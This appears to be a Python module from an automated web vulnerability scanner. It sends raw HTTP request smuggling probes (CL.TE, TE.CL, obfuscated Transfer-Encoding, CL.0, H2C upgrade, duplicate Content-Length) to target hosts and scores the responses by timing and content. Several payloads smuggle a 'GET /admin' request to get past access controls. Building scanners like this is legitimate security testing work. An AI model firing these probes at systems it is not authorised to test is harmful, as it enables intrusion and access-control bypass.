"""
WhiteHatHacker AI — HTTP Request Smuggling Active Prober

Tests for HTTP request smuggling / desync vulnerabilities using
raw socket-level probes. This complements smuggler_wrapper.py by
performing self-contained checks that don't require the external
smuggler binary.

Techniques tested:
- CL.TE (Content-Length vs Transfer-Encoding)
- TE.CL (Transfer-Encoding vs Content-Length)
- TE.TE (Transfer-Encoding obfuscation)
- CL.0 (Content-Length: 0 with body)
- HTTP/2 downgrade smuggling indicators

Detection method:
- Time-based differential: malformed smuggling payloads cause different
  response times compared to baseline requests.
- Response differential: some servers return different status codes or
  body content when a smuggled prefix interferes with the next request.

References:
- https://portswigger.net/research/http-request-smuggling
- https://portswigger.net/research/http2-the-sequel-is-always-worse
- CWE-444: Inconsistent Interpretation of HTTP Requests
"""

from __future__ import annotations

import asyncio
import socket
import ssl as _ssl
import time
from urllib.parse import urlparse

from loguru import logger

from src.tools.base import Finding
from src.utils.constants import SeverityLevel


# ── Time-based detection thresholds ───────────────────────────

# If the smuggling probe response takes >THRESHOLD_SECONDS longer than
# the baseline, we consider it a potential smuggling indicator.
BASELINE_SAMPLES = 3
DELAY_THRESHOLD = 3.0  # seconds (smuggling payloads force timeout/delay)
SOCKET_TIMEOUT = 10.0
RECV_SIZE = 4096


# ── Smuggling probe payloads ──────────────────────────────────

def _clte_probe(host: str) -> bytes:
    """CL.TE smuggling probe: front-end uses CL, back-end uses TE."""
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"
    ).encode()


def _tecl_probe(host: str) -> bytes:
    """TE.CL smuggling probe: front-end uses TE, back-end uses CL."""
    body = (
        "5c\r\n"
        "GPOST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    )
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def _tete_probes(host: str) -> list[tuple[str, bytes]]:
    """TE.TE smuggling probes: obfuscated Transfer-Encoding variants."""
    obfuscations = [
        ("TE space", "Transfer-Encoding : chunked"),
        ("TE tab", "Transfer-Encoding:\tchunked"),
        ("TE newline", "Transfer-Encoding\r\n : chunked"),
        ("TE duplicate", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
        ("TE case", "Transfer-encoding: chunked"),
        ("TE xchunked", "Transfer-Encoding: xchunked"),
        ("TE null", "Transfer-Encoding: chunked\x00"),
    ]
    probes = []
    for name, te_header in obfuscations:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"{te_header}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()
        probes.append((name, payload))
    return probes


def _cl0_probe(host: str) -> bytes:
    """CL.0 smuggling probe: Content-Length: 0 with body content."""
    return (
        f"POST /resources HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
        f"GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    ).encode()


def _baseline_request(host: str) -> bytes:
    """Normal, well-formed request for baseline timing."""
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()


# ── H2C Smuggling probe (T3-3) ──────────────────────────────

def _h2c_upgrade_probe(host: str) -> bytes:
    """
    HTTP/2 cleartext upgrade smuggling probe.

    Sends an HTTP/1.1 Upgrade: h2c request. If the reverse proxy
    forwards this to the backend, it may tunnel a raw TCP connection
    that bypasses access controls and WAFs.

    Ref: https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http2-cleartext-h2c
    """
    return (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
        f"\r\n"
    ).encode()


def _cl_cl_probe(host: str) -> bytes:
    """Duplicate Content-Length smuggling probe."""
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 0\r\n"
        f"Content-Length: 44\r\n"
        f"\r\n"
        f"GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
    ).encode()


# ── Socket helpers ────────────────────────────────────────────

async def _send_raw(
    host: str,
    port: int,
    use_ssl: bool,
    payload: bytes,
    timeout: float = SOCKET_TIMEOUT,
) -> tuple[float, str, int]:
    """
    Send raw bytes to host:port and measure response time.

    Returns:
        (elapsed_seconds, response_snippet, response_length)
    """
    loop = asyncio.get_running_loop()

    def _blocking_send() -> tuple[float, str, int]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        start = time.monotonic()

        try:
            if use_ssl:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.sendall(payload)

            data = b""
            try:
                while True:
                    chunk = sock.recv(RECV_SIZE)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > RECV_SIZE * 4:
                        break
            except socket.timeout:
                pass

            elapsed = time.monotonic() - start
            text = data.decode("utf-8", errors="replace")[:1000]
            return elapsed, text, len(data)

        except socket.timeout:
            elapsed = time.monotonic() - start
            return elapsed, "TIMEOUT", 0
        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            return 0.0, f"ERROR: {e}", 0
        finally:
            try:
                sock.close()
            except Exception as _exc:
                logger.debug(f"http smuggling prober error: {_exc}")

    return await loop.run_in_executor(None, _blocking_send)


# ── Main scanner ──────────────────────────────────────────────

async def check_http_smuggling(
    target_urls: list[str],
    max_concurrent: int = 2,
    timeout: float = SOCKET_TIMEOUT,
) -> list[Finding]:
    """
    Test URLs for HTTP request smuggling vulnerabilities.

    Uses raw sockets to send smuggling probes and compares response
    times against baseline to detect potential smuggling.

    Args:
        target_urls: URLs to test (protocol://host[:port]).
        max_concurrent: Max concurrent connections.
        timeout: Socket timeout per connection.

    Returns:
        List of Finding objects.
    """
    findings: list[Finding] = []
    sem = asyncio.Semaphore(max_concurrent)

    for url in target_urls:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        use_ssl = parsed.scheme == "https"
        port = parsed.port or (443 if use_ssl else 80)

        if not host:
            continue

        try:
            result = await _test_single_host(host, port, use_ssl, sem, timeout, url)
            findings.extend(result)
        except Exception as e:
            logger.debug(f"Smuggling test error for {url}: {e}")

    logger.info(f"HTTP smuggling check completed: {len(findings)} findings across {len(target_urls)} URLs")
    return findings


async def _test_single_host(
    host: str,
    port: int,
    use_ssl: bool,
    sem: asyncio.Semaphore,
    timeout: float,
    original_url: str,
) -> list[Finding]:
    """Test a single host for all smuggling techniques."""
    findings: list[Finding] = []

    # Step 1: Establish baseline timing
    baseline_times: list[float] = []
    for _ in range(BASELINE_SAMPLES):
        async with sem:
            elapsed, _, _ = await _send_raw(host, port, use_ssl, _baseline_request(host), timeout)
            if elapsed > 0:
                baseline_times.append(elapsed)
            await asyncio.sleep(0.2)

    if not baseline_times:
        logger.debug(f"No baseline for {host}:{port} — skipping")
        return findings

    avg_baseline = sum(baseline_times) / len(baseline_times)
    logger.debug(f"Baseline for {host}:{port}: avg {avg_baseline:.2f}s")

    # Step 2: CL.TE probe
    async with sem:
        elapsed, resp_text, resp_len = await _send_raw(
            host, port, use_ssl, _clte_probe(host), timeout
        )
        if _is_smuggling_indicator(elapsed, avg_baseline, resp_text):
            findings.append(_make_finding(
                "CL.TE", host, port, original_url,
                elapsed, avg_baseline, resp_text,
            ))

    # Step 3: TE.CL probe
    async with sem:
        elapsed, resp_text, resp_len = await _send_raw(
            host, port, use_ssl, _tecl_probe(host), timeout
        )
        if _is_smuggling_indicator(elapsed, avg_baseline, resp_text):
            findings.append(_make_finding(
                "TE.CL", host, port, original_url,
                elapsed, avg_baseline, resp_text,
            ))

    # Step 4: TE.TE probes (multiple obfuscation variants)
    for variant_name, probe_payload in _tete_probes(host):
        async with sem:
            elapsed, resp_text, resp_len = await _send_raw(
                host, port, use_ssl, probe_payload, timeout
            )
            if _is_smuggling_indicator(elapsed, avg_baseline, resp_text):
                findings.append(_make_finding(
                    f"TE.TE ({variant_name})", host, port, original_url,
                    elapsed, avg_baseline, resp_text,
                ))
                break  # One TE.TE variant is enough

    # Step 5: CL.0 probe
    async with sem:
        elapsed, resp_text, resp_len = await _send_raw(
            host, port, use_ssl, _cl0_probe(host), timeout
        )
        if _is_smuggling_indicator(elapsed, avg_baseline, resp_text):
            findings.append(_make_finding(
                "CL.0", host, port, original_url,
                elapsed, avg_baseline, resp_text,
            ))

    # Step 6: H2C smuggling probe (T3-3)
    async with sem:
        elapsed, resp_text, resp_len = await _send_raw(
            host, port, use_ssl, _h2c_upgrade_probe(host), timeout
        )
        # H2C is indicated by 101 Switching Protocols or h2c echo
        resp_lower = resp_text.lower()
        if "101 switching" in resp_lower or "upgrade: h2c" in resp_lower:
            findings.append(Finding(
                title=f"H2C Smuggling Upgrade Accepted: {host}:{port}",
                description=(
                    f"The server accepted an HTTP/2 cleartext (h2c) upgrade request. "
                    f"If a reverse proxy forwards this upgrade, an attacker can tunnel "
                    f"raw HTTP/2 traffic directly to the backend, bypassing proxy-level "
                    f"WAF, authentication, and access controls.\n"
                    f"Target: {original_url}"
                ),
                vulnerability_type="http_request_smuggling",
                severity=SeverityLevel.HIGH,
                confidence=80.0,
                target=original_url,
                endpoint=f"{host}:{port}",
                tool_name="http_smuggling_prober",
                cwe_id="CWE-444",
                tags=["smuggling", "h2c", "upgrade", "desync"],
                evidence=f"Response to h2c upgrade: {resp_text[:300]}",
                metadata={"technique": "H2C", "response_snippet": resp_text[:500]},
            ))

    # Step 7: CL.CL (duplicate Content-Length) probe (T3-3)
    async with sem:
        elapsed, resp_text, resp_len = await _send_raw(
            host, port, use_ssl, _cl_cl_probe(host), timeout
        )
        if _is_smuggling_indicator(elapsed, avg_baseline, resp_text):
            findings.append(_make_finding(
                "CL.CL", host, port, original_url,
                elapsed, avg_baseline, resp_text,
            ))

    return findings


# ── Detection helpers ─────────────────────────────────────────

def _is_smuggling_indicator(
    probe_time: float,
    baseline_avg: float,
    response_text: str,
) -> bool:
    """
    Determine if a probe response indicates potential smuggling.

    Indicators:
    - Response time significantly exceeds baseline (time-based detection)
    - Response contains smuggling-indicative content
    """
    # Time-based: significant delay suggests the server is confused
    if probe_time > baseline_avg + DELAY_THRESHOLD:
        return True

    # Content-based indicators
    response_lower = response_text.lower()
    smuggling_indicators = [
        "400 bad request",  # Malformed request reached backend
        "unrecognized method",
        "invalid request",
        "gpost",  # Our smuggled prefix leaked
    ]
    # Count indicators — one is not enough (could be normal error)
    matches = sum(1 for ind in smuggling_indicators if ind in response_lower)
    if matches >= 2:
        return True

    return False


def _make_finding(
    technique: str,
    host: str,
    port: int,
    original_url: str,
    probe_time: float,
    baseline_avg: float,
    resp_snippet: str,
) -> Finding:
    """Create a Finding for a smuggling detection."""
    is_time_based = probe_time > baseline_avg + DELAY_THRESHOLD
    severity = SeverityLevel.HIGH
    confidence = 75.0 if is_time_based else 65.0

    evidence_parts = [
        f"Technique: {technique}",
        f"Target: {host}:{port}",
        f"Baseline response time: {baseline_avg:.2f}s",
        f"Probe response time: {probe_time:.2f}s",
        f"Delta: {probe_time - baseline_avg:.2f}s",
    ]
    if is_time_based:
        evidence_parts.append(f"TIME-BASED DETECTION (>{DELAY_THRESHOLD}s delay)")
    if resp_snippet and resp_snippet != "TIMEOUT":
        evidence_parts.append(f"Response snippet: {resp_snippet[:300]}")

    return Finding(
        title=f"HTTP Request Smuggling ({technique}): {host}:{port}",
        description=(
            f"Potential HTTP request smuggling detected using {technique} technique. "
            f"{'Time-based detection' if is_time_based else 'Response-based detection'}: "
            f"probe took {probe_time:.2f}s vs {baseline_avg:.2f}s baseline "
            f"(delta {probe_time - baseline_avg:.2f}s). "
            f"HTTP request smuggling can lead to cache poisoning, credential hijacking, "
            f"WAF bypass, and access control bypass."
        ),
        vulnerability_type="http_request_smuggling",
        severity=severity,
        confidence=confidence,
        target=original_url,
        endpoint=f"{host}:{port}",
        tool_name="http_smuggling_prober",
        cwe_id="CWE-444",
        tags=["smuggling", "desync", technique.lower().replace(".", "_").split()[0]],
        evidence="\n".join(evidence_parts),
        metadata={
            "technique": technique,
            "baseline_avg": round(baseline_avg, 3),
            "probe_time": round(probe_time, 3),
            "delta": round(probe_time - baseline_avg, 3),
            "detection_method": "time_based" if is_time_based else "response_based",
        },
    )


__all__ = ["check_http_smuggling"]
